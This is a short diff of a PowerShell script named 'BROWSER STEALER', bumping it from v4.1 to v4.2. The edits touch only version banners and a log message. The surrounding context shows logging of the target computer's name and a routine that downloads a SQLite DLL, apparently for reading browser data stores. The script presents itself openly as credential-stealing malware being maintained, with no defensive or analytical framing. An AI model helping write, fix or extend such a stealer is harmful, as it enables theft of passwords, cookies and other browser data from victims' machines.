@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER v4.1 — CLEAN SYNTAX
+# BROWSER STEALER v4.2 — FINAL FIXED
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -25,7 +25,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "BROWSER STEALER v4.1"
+Write-Log "BROWSER STEALER v4.2"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Log: $LOGFILE"
 Write-Log "============================================"
@@ -48,7 +48,7 @@ function Download-Dll {
 $sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
 $sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"
 if (-not $sqliteOk) {
-    Write-Log "SQLite download failed — aborting"
+    Write-Log "SQLite download failed - aborting"
     exit
 }
 
